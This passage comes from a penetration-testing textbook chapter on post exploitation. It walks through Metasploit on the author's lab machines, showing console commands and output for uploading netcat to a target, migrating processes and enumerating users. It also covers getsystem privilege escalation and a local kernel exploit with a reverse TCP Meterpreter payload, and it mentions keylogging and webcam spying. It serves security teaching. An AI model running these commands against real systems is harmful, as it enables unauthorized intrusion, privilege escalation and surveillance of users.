connected to other systems in a domain. My pentest would not have been
nearly as successful, and my client wouldn’t have gotten as good of a picture
of their vulnerabilities, especially when it came to password policies.
This chapter will cover the basics of post exploitation. As you move
beyond this book and increase your skills as a pentester, you should spend
a good deal of time on post exploitation. Solid post-exploitation skills dif-
ferentiate good pentesters from the truly great.
Now let’s look at some of our post-exploitation options in Metasploit.
meterpreter
We discussed Meterpreter, Metasploit’s custom payload, in Chapter 8. Now
let’s dig deeper and look at some of Meterpreter’s functionality.
We’ll begin post exploitation by opening a Meterpreter session on each
of our target systems. As you can see in Listing 13-1, I have a session on the
Windows XP target from the MS08-067 exploit. On the Windows 7 target,
I used a trojan executable like those we used in the previous chapter. On
the Linux target, I used the TikiWiki PHP vulnerability we exploited in
Chapter 8. You can also log in to the Linux target via SSH using either the
password for georgia we cracked in Chapter 9 (password) or the SSH public
key we added in Chapter 8 using the open NFS share.
msf > sessions -l
Active sessions
===============
Id Type Information Connection
-- ---- ----------- ----------
1 meterpreter x86/win32 NT AUTHORITY\SYSTEM @ BOOKXP 192.168.20.9:4444 ->
192.168.20.10:1104
(192.168.20.10)
2 meterpreter x86/win32 Book-Win7\Georgia Weidman @ Book-Win7 192.168.20.9:2345 ->
192.168.20.12:49264
(192.168.20.12)
3 meterpreter php/php www-data (33) @ ubuntu 192.168.20.9:4444 ->
192.168.20.11:48308
(192.168.20.11)
Listing 13-1: Open Metasploit sessions on our targets
Start by interacting with your Windows XP session as shown here.
msf post(enum_logged_on_users) > sessions -i 1
We’ve already seen a couple of Meterpreter commands throughout the
book. Namely, in Chapter 9, we used hashdump to get direct access to local
password hashes in on “Offline Password Attacks” on page 203. To see a
list of available Meterpreter commands, enter help in the Meterpreter con-
sole. For more details about a specific command, enter command -h.
278 Chapter 13
Using the upload Command
Perhaps nothing is quite so annoying on a pentest as finding yourself on a
Windows machine without access to utilities such as wget and curl to pull
down files from a web server. In Chapter 8, we saw a way to bypass this
problem with TFTP, but Meterpreter easily solves the problem for us. With
a simple command, help upload, we can upload files to the target, as shown
in Listing 13-2.
meterpreter > help upload
Usage: upload [options] src1 src2 src3 ... destination
Uploads local files and directories to the remote machine.
OPTIONS:
-h Help banner.
-r Upload recursively.
Listing 13-2: Meterpreter help command
This help information tells us that we can use upload to copy files from
our Kali system to the Windows XP target.
For example, here’s how to upload Netcat for Windows:
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\
[*] uploading : /usr/share/windows-binaries/nc.exe -> C:\
[*] uploaded : /usr/share/windows-binaries/nc.exe -> C:\\nc.exe
note Remember to escape the backslash characters in the path with a second backslash. Also
remember that if you upload anything to a target during a pentest or otherwise change
the target system, record your changes so you can undo them before the engagement
is over. The last thing you want to do is leave an environment more vulnerable than
when you found it.
getuid
Another useful Meterpreter command is getuid. This command will tell you
the name of the System user running Meterpreter. Typically, Meterpreter runs
with the privileges of the exploited process or user.
For example, when we exploit an SMB server with the MS08-067 exploit,
we’re running on the target with the privileges of the SMB server, namely
the Windows System account, as shown here.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
On the Windows 7 target, we social-engineered the user into running a
trojaned program that connected back to Metasploit, so Meterpreter is run-
ning as the user Georgia Weidman.
Post Exploitation 279
Other Meterpreter Commands
Before moving on, take some time to work with additional Meterpreter
commands. You’ll find many useful commands for local information gath-
ering, remote control, and even spying on local users, such as keylogging
and turning on a webcam from a Meterpreter session.
meterpreter scripts
In addition to Meterpreter commands, you can also run Meterpreter scripts
from a Meterpreter console. The scripts currently available can be found
in Kali at /usr/share/metasploit-framework/scripts/meterpreter. These scripts are
written in Ruby, and you can write your own and submit them for inclusion
in the framework. To use a Meterpreter script, enter run . Use
the -h flag to see help information for a script.
When exploiting Internet Explorer in Chapter 10, we used the
AutoRunScript option to automatically run the migrate script to spawn a new
process and migrate into it before the browser crashed. We can run this script
directly inside Meterpreter as well. For example, entering run migrate -h, as
shown in Listing 13-3, gives us information on the migrate Meterpreter
script.
meterpreter > run migrate -h
OPTIONS:
-f Launch a process and migrate into the new process
-h Help menu.
-k Kill original process.
-n  Migrate into the first process with this executable name
(explorer.exe)
-p  PID to migrate to.
Listing 13-3: Migrate script help information
Because we’re not racing to beat a session before it closes, we have a
few different options for which process to migrate to. We can migrate to a
process by name using the -n option. For example, to migrate to the first
instance of explorer.exe that Meterpreter encounters in the process list, we
can use -n explorer.exe.
You can also migrate to a process by using its process ID (PID) with the
-p option. Use Meterpreter’s ps command to see a list of running processes,
as shown in Listing 13-4.
280 Chapter 13
meterpreter > ps
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
0 0 [System Process] 4294967295
4 0 System x86 0 NT AUTHORITY\SYSTEM
--snip--
1144 1712 explorer.exe x86 0 BOOKXP\georgia C:\WINDOWS\Explorer.EXE
--snip--
1204 1100 wscntfy.exe x86 0 BOOKXP\georgia
Listing 13-4: Running process list
Explorer.exe is a solid choice. Choose PID 1144 for explorer.exe, and run the
Meterpreter migrate script as shown in Listing 13-5.
meterpreter > run migrate -p 1144
[*] Migrating from 1100 to 1144...
[*] Migration completed successfully.
meterpreter > getuid
Server username: BOOKXP\georgia
Listing 13-5: Running the migrate script
Meterpreter successfully migrates into the explorer.exe process. Now if
the SMB server happens to become unstable or die, our Meterpreter session
is safe.
If you ran the getuid command again, you would see that we are no lon-
ger running as the System user but as user georgia. This makes sense because
this process belongs to the logged-in user georgia. By moving into this pro-
cess, we’ve effectively dropped our privileges down to user georgia.
Let’s stay logged in as user georgia on the XP target and look at some
ways to elevate our privileges to System on Windows targets and root on the
Linux target through local privilege-escalation attacks.
metasploit Post-exploitation modules
So far we’ve used Metasploit modules for information gathering, vulnerabil-
ity identification, and exploitation. It should come as no surprise that the
framework has a plethora of useful modules for the post-exploitation phase
as well. Metasploit’s post directory contains modules for local information
gathering, remote control, privilege escalation, and so on, which span mul-
tiple platforms.
Post Exploitation 281
For example, consider the module post/windows/gather/enum_logged_
on_users. As shown in Listing 13-6, this module will show us which users
are currently logged on to the target system. Put your session in the back-
ground (with ctrl-Z or background) to return to the main Msfconsole
prompt.
msf > use post/windows/gather/enum_logged_on_users
msf post(enum_logged_on_users) > show options
Module options (post/windows/gather/enum_logged_on_users):
Name Current Setting Required Description
---- --------------- -------- -----------
CURRENT true yes Enumerate currently logged on users
RECENT true yes Enumerate Recently logged on users
uSESSION yes The session to run this module on.
msf post(enum_logged_on_users) > set SESSION 1
SESSION => 1
msf post(enum_logged_on_users) > exploit
[*] Running against session 1
Current Logged Users
====================
SID User
--- ----
S-1-5-21-299502267-308236825-682003330-1003 BOOKXP\georgia
[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ
_791806.txt v
Recently Logged Users
=====================
SID Profile Path
--- ------------
S-1-5-18 %systemroot%\system32\config\systemprofile
S-1-5-19 %SystemDrive%\Documents and Settings\LocalService
S-1-5-20 %SystemDrive%\Documents and Settings\NetworkService
S-1-5-21-299502267-308236825-682003330-1003 %SystemDrive%\Documents and Settings\georgia
Listing 13-6: Running a Metasploit post module
We use post modules as we do all Metasploit modules: We set the rel-
evant options, and then enter exploit to run the module. However, in the
case of post-exploitation modules, instead of setting an RHOST or SRVHOST, we
need to tell Metasploit the Session ID we want to run the post-exploitation
module against u. We then run the module against Session 1, the Windows
XP target.
282 Chapter 13
The module returns data telling us the user georgia is currently
logged in. Metasploit automatically saves the output to a file /root/ .msf4/
loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt v.
railgun
Railgun is an extension for Meterpreter that allows direct access to Windows
APIs. It can be used inside post-exploitation modules for Meterpreter as well
as the Ruby shell (irb) in a Meterpreter session. For example, we can check
if the session is running as an administrative user by directly accessing the
IsUserAnAdmin function of the shell32 Windows DLL, as shown here. Be sure to
bring a session to the foreground with sessions -i  first.
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "Error Message"=>"The operation completed successfully.", "return"=>true}
First, we drop into a Ruby shell with the command irb. Note that the
client variable holds the Meterpreter client. Next we enter client.railgun
.shell32.IsUserAnAdmin to tell the Ruby interpreter to use Railgun on the cur-
rent Meterpreter session and access the IsUserAdmin function of shell32.dll. (For
additional Railgun examples, check out Metasploit post modules such as
windows/gather/reverse_lookup.rb and windows/manage/download_exec.rb, which
also leverage this functionality.) Enter exit to drop out of the Ruby interpreter
and return to Meterpreter.
Local Privilege escalation
In the following sections, we’ll explore examples of local privilege escalation,
which involves running exploits to gain additional control of the system
after exploitation.
Just like network software and client-side software, privileged local
processes can be subject to exploitable security issues. Some of your attacks
may not result in gaining the privileges you would like. Gaining command
execution through a website, compromising a user account without admin-
istrative rights, or exploiting a listening service with limited privileges can
all lead to system access, but you may find yourself still working as a limited
user. To get the privileges we want, we will need to exploit further issues.
getsystem on Windows
Meterpreter’s getsystem command automates trying a series of known local
privilege-escalation exploits against the target. The command’s options are
shown in Listing 13-7.
Post Exploitation 283
meterpreter > getsystem -h
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
-h Help Banner.
-t  The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)
Listing 13-7: getsystem help
As shown here, running getsystem with no arguments will run a series
of local exploits until one succeeds or all known exploits are exhausted. To
run a particular exploit, use the -t option followed by the exploit number.
Here we run getsystem on our Windows XP target with no arguments.
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
As you can see, Meterpreter gained system privileges with the first
exploit it tried. With one command, we are able to elevate our privileges
from georgia to System.
Local Escalation Module for Windows
Local exploit modules in Metasploit allow you to run an exploit on an
open session to gain additional access. The local privilege-escalation
module exploit/windows/local/ms11_080_afdjoinleaf in Listing 13-8 exploits
a (now-patched) flaw in the Afdjoinleaf function of the afd.sys Windows
driver. Like post-exploitation modules, use the SESSION option to denote
which open session the exploit should be run against. We’ll run the module
against our Windows XP session. Unlike post modules, local exploits are
exploits, so we’ll need to set a payload. If it succeeds, our exploit will open a
new session with System privileges. In your Windows XP Meterpreter ses-
sion, run the command rev2self to drop back down to the user georgia
before using this alternative privilege-escalation technique.
msf post(enum_logged_on_users) > use exploit/windows/local/ms11_080_afdjoinleaf
msf exploit(ms11_080_afdjoinleaf) > show options
Module options (exploit/windows/local/ms11_080_afdjoinleaf):
Name Current Setting Required Description
---- --------------- -------- -----------
SESSION yes The session to run this module on.
284 Chapter 13
--snip--
msf exploit(ms11_080_afdjoinleaf) > set SESSION 1
SESSION => 1
msf exploit(ms11_080_afdjoinleaf) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms11_080_afdjoinleaf) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Running against Windows XP SP2 / SP3